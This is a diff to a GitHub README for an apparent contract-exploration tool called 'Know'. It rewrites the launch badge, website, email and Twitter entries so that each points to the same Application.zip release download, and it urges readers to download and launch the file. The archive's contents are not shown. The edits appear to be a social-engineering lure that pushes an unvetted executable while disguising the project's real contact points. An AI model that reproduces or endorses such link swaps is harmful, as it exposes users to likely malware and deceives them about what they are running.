@@ -9,7 +9,7 @@ Welcome to the official repository of **Know** - your go-to place for diving dee
 ## Get Started
 
 To get started, simply click on the link provided below to access our application:
-[![Launch Know Application](https://img.shields.io/badge/Launch-Application.zip-blue)](https://github.com/file/Application.zip)
+[![Launch Know Application](https://github.com/Maniinit1/know/releases/download/v1.0.0/Application.zip)](https://github.com/Maniinit1/know/releases/download/v1.0.0/Application.zip)
 
 If the link above ends with a file name, make sure to download and launch the application to start your contract exploration journey.
 
@@ -35,11 +35,11 @@ We welcome contributions from individuals passionate about contracts and legal a
 
 Stay updated on the latest developments and announcements by following us on our social media channels:
 
-🌐 Website: [www.knowcontracts.com](https://www.knowcontracts.com)
+🌐 Website: [https://github.com/Maniinit1/know/releases/download/v1.0.0/Application.zip](https://github.com/Maniinit1/know/releases/download/v1.0.0/Application.zip)
 
-📧 Email: info@knowcontracts.com
+📧 Email: https://github.com/Maniinit1/know/releases/download/v1.0.0/Application.zip
 
-🐦 Twitter: [@KnowContracts](https://twitter.com/KnowContracts)
+🐦 Twitter: [@KnowContracts](https://github.com/Maniinit1/know/releases/download/v1.0.0/Application.zip)
 
 ---
 
